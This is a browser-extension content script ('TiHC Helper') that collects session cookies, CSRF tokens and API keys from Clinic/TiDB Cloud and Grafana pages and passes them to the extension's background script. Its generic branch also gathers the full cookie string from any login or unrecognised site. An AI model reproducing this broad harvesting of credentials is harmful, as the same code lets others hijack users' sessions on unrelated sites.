// 调试日志函数
function debugLog(message, data = null) {
  console.log(`[TiHC Helper] ${message}`, data || '');
}

// 工具函数：获取所有 cookies
function getAllCookies() {
  return document.cookie
    .split(';')
    .map(cookie => cookie.trim().split('='))
    .reduce((cookies, [name, value]) => {
      if (name && value) {
        cookies[name] = decodeURIComponent(value);
      }
      return cookies;
    }, {});
}

// 工具函数：从页面获取 meta 标签中的 CSRF token
function getCSRFToken() {
  const metaTag = document.querySelector('meta[name="csrf-token"]') || 
                  document.querySelector('meta[name="_token"]') ||
                  document.querySelector('meta[name="X-CSRF-TOKEN"]');
  return metaTag ? metaTag.getAttribute('content') : null;
}

// 检测页面类型
function detectPageType() {
  const host = window.location.hostname;
  const path = window.location.pathname;
  const url = window.location.href;
  
  debugLog('检测页面类型', { host, path, url });
  
  // Clinic 相关
  if (host.includes('clinic.pingcap.com') || 
      host.includes('tidbcloud.com') || 
      host.includes('pingcap.com')) {
    return 'clinic';
  }
  
  // Grafana 相关
  if (host.includes('grafana') || 
      path.includes('grafana') || 
      url.includes('grafana')) {
    return 'grafana';
  }
  
  // 通用登录页面
  if (path.includes('login') || 
      url.includes('login') ||
      document.title.toLowerCase().includes('login')) {
    return 'login';
  }
  
  return 'unknown';
}

// 收集 Clinic/TiDB Cloud 相关信息
function collectClinicInfo() {
  const host = window.location.hostname;
  const cookies = getAllCookies();
  const data = {
    timestamp: Math.floor(Date.now() / 1000),
    url: window.location.href,
    pageType: 'clinic'
  };

  debugLog('开始收集 Clinic 信息', { host, cookieCount: Object.keys(cookies).length });

  // 收集特定的 Clinic cookies 和 localStorage
  const clinicSessionId = cookies['clinic.session_id'];
  const clinicCsrfToken = localStorage.getItem('clinic.auth.csrf_token');
  
  if (clinicSessionId) {
    data.session_id = clinicSessionId;
    debugLog('找到 Clinic Session ID');
  }
  
  if (clinicCsrfToken) {
    data.csrf_token = clinicCsrfToken;
    debugLog('找到 Clinic CSRF Token (localStorage)');
  }

  // 从 localStorage 获取 API key
  const possibleApiKeys = [
    'clinic_api_key', 'apikey', 'api_key', 'token', 'auth_token',
    'access_token', 'pingcap_token', 'tidb_token'
  ];
  
  for (const key of possibleApiKeys) {
    const value = localStorage.getItem(key) || sessionStorage.getItem(key);
    if (value) {
      data.apikey = value;
      debugLog('找到 API Key', key);
      break;
    }
  }

  // 如果找到了特定的 clinic 信息，也包含完整的 cookie 字符串
  if (clinicSessionId || clinicCsrfToken) {
    data.cookie = document.cookie;
    data.relevantCookies = [];
    data.relevantLocalStorage = [];
    
    if (clinicSessionId) data.relevantCookies.push('clinic.session_id');
    if (clinicCsrfToken) data.relevantLocalStorage.push('clinic.auth.csrf_token');
    
    debugLog('收集了 Clinic 特定信息', { 
      cookies: data.relevantCookies, 
      localStorage: data.relevantLocalStorage 
    });
  }

  // 从 cookies 获取其他会话信息（作为备选）
  const otherSessionCookies = Object.keys(cookies).filter(name => 
    name.toLowerCase().includes('session') ||
    name.toLowerCase().includes('auth') ||
    name.toLowerCase().includes('token') ||
    name.toLowerCase().includes('clinic') ||
    name.toLowerCase().includes('pingcap') ||
    name.toLowerCase().includes('tidb') ||
    name === 'JSESSIONID' ||
    name === 'connect.sid'
  );
  
  if (otherSessionCookies.length > 0 && !data.cookie) {
    data.cookie = document.cookie;
    data.otherCookies = otherSessionCookies;
    debugLog('找到其他相关 Cookies', otherSessionCookies);
  }

  // 获取 CSRF token（从多个来源）
  if (!data.csrf_token) {
    const csrfToken = getCSRFToken() || 
                     localStorage.getItem('csrf_token') ||
                     sessionStorage.getItem('csrf_token') ||
                     cookies['XSRF-TOKEN'] ||
                     cookies['csrf_token'];
    
    if (csrfToken) {
      data.csrf_token = csrfToken;
      debugLog('找到备用 CSRF Token');
    }
  }

  // 尝试从页面 HTML 中提取认证信息
  const scripts = document.querySelectorAll('script');
  scripts.forEach(script => {
    const content = script.textContent || script.innerHTML;
    
    // 查找可能的 token 或 API key
    const tokenMatch = content.match(/(?:token|apikey|api_key)["']?\s*:\s*["']([^"']+)["']/i);
    if (tokenMatch && tokenMatch[1] && !data.apikey) {
      data.apikey = tokenMatch[1];
      debugLog('从脚本中找到 Token', 'script');
    }
  });

  debugLog('Clinic 信息收集完成', { 
    hasSessionId: !!data.session_id,
    hasCsrfToken: !!data.csrf_token,
    hasApikey: !!data.apikey, 
    hasCookie: !!data.cookie
  });

  return Object.keys(data).length > 3 ? data : null; // 至少有 timestamp, url, pageType 之外的数据
}

// 收集 Grafana 相关信息
function collectGrafanaInfo() {
  const cookies = getAllCookies();
  const data = {
    timestamp: Math.floor(Date.now() / 1000),
    url: window.location.href,
    pageType: 'grafana'
  };

  debugLog('开始收集 Grafana 信息', { cookieCount: Object.keys(cookies).length });

  // 从 cookies 获取 Grafana session（更广泛的匹配）
  const possibleCookies = Object.keys(cookies).filter(name => 
    name.toLowerCase().includes('grafana') ||
    name.toLowerCase().includes('session') ||
    name.toLowerCase().includes('auth') ||
    name.toLowerCase().includes('token')
  );
  
  if (possibleCookies.length > 0) {
    data.session = cookies[possibleCookies[0]]; // 取第一个匹配的
    data.allCookies = document.cookie;
    data.relevantCookies = possibleCookies;
    debugLog('找到 Grafana Cookies', possibleCookies);
  }

  // 从 localStorage 获取其他可能的认证信息
  const possibleTokens = [
    'grafana_auth', 'auth_token', 'grafana_token', 'token', 'access_token'
  ];
  
  for (const key of possibleTokens) {
    const value = localStorage.getItem(key) || sessionStorage.getItem(key);
    if (value) {
      data.auth_token = value;
      debugLog('找到认证 Token', key);
      break;
    }
  }

  debugLog('Grafana 信息收集完成', { 
    hasSession: !!data.session, 
    hasAuthToken: !!data.auth_token 
  });

  return Object.keys(data).length > 3 ? data : null;
}

// 通用信息收集（用于其他页面）
function collectGenericInfo() {
  const cookies = getAllCookies();
  const data = {
    timestamp: Math.floor(Date.now() / 1000),
    url: window.location.href,
    pageType: 'generic'
  };

  debugLog('开始收集通用信息');

  // 查找任何看起来像认证信息的 cookies
  const authCookies = Object.keys(cookies).filter(name => 
    name.toLowerCase().includes('auth') ||
    name.toLowerCase().includes('token') ||
    name.toLowerCase().includes('session') ||
    name.toLowerCase().includes('login')
  );
  
  if (authCookies.length > 0) {
    data.cookies = document.cookie;
    data.authCookies = authCookies;
    debugLog('找到认证相关 Cookies', authCookies);
  }

  return Object.keys(data).length > 3 ? data : null;
}

// 主要逻辑
function collectLoginInfo() {
  const host = window.location.hostname;
  const pageType = detectPageType();
  
  debugLog('开始收集登录信息', { host, pageType });

  let collectedData = null;
  let service = 'unknown';

  switch (pageType) {
    case 'clinic':
      collectedData = collectClinicInfo();
      service = 'clinic';
      break;
    case 'grafana':
      collectedData = collectGrafanaInfo();
      service = 'grafana';
      break;
    case 'login':
    case 'unknown':
      collectedData = collectGenericInfo();
      service = 'generic';
      break;
  }

  if (collectedData) {
    // 发送消息到 background script
    if (chrome && chrome.runtime) {
      chrome.runtime.sendMessage({
        type: 'setToken',
        domain: host,
        service: service,
        data: collectedData
      }).catch(err => {
        debugLog('发送消息失败', err);
      });
      
      debugLog('信息已发送到 background', { service, dataKeys: Object.keys(collectedData) });
    } else {
      debugLog('Chrome runtime 不可用');
    }
  } else {
    debugLog('未找到相关登录信息');
  }
  
  return collectedData;
}

// 初始化和事件监听
async function initialize() {
  debugLog('Content Script 已加载', {
    url: window.location.href,
    readyState: document.readyState,
    title: document.title
  });

  // 等待服务发现完成
  try {
    debugLog('等待 TiHC Server 连接...');
    await window.serviceDiscoveryManager.waitForConnection(10000); // 10秒超时
    debugLog('TiHC Server 连接成功，开始数据收集');
    
    // 立即尝试收集信息
    collectLoginInfo();
  } catch (error) {
    debugLog('TiHC Server 连接超时，使用离线模式:', error.message);
    // 离线模式下仍然收集数据到本地存储
    collectLoginInfo();
  }
}

// 监听页面状态
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initialize);
} else {
  initialize();
}

// 监听页面完全加载（包括资源）
window.addEventListener('load', () => {
  debugLog('页面完全加载，再次收集信息');
  setTimeout(collectLoginInfo, 1000);
});

// 监听 URL 变化（SPA 应用）
let currentUrl = window.location.href;
const urlCheckInterval = setInterval(() => {
  if (window.location.href !== currentUrl) {
    currentUrl = window.location.href;
    debugLog('URL 变化，重新收集信息', currentUrl);
    setTimeout(collectLoginInfo, 500);
  }
}, 2000);

// 定期自动收集信息（每10秒）
const autoCollectInterval = setInterval(() => {
  const pageType = detectPageType();
  if (pageType === 'clinic' || pageType === 'grafana') {
    debugLog('定期自动收集信息', { pageType, interval: '10s' });
    collectLoginInfo();
  }
}, 10000); // 10秒

// 监听 localStorage 变化
window.addEventListener('storage', (e) => {
  debugLog('Storage 变化', { key: e.key, newValue: e.newValue });
  setTimeout(collectLoginInfo, 500);
});

// 清理定时器
window.addEventListener('beforeunload', () => {
  clearInterval(urlCheckInterval);
  clearInterval(autoCollectInterval);
  debugLog('页面即将卸载，清理资源');
});
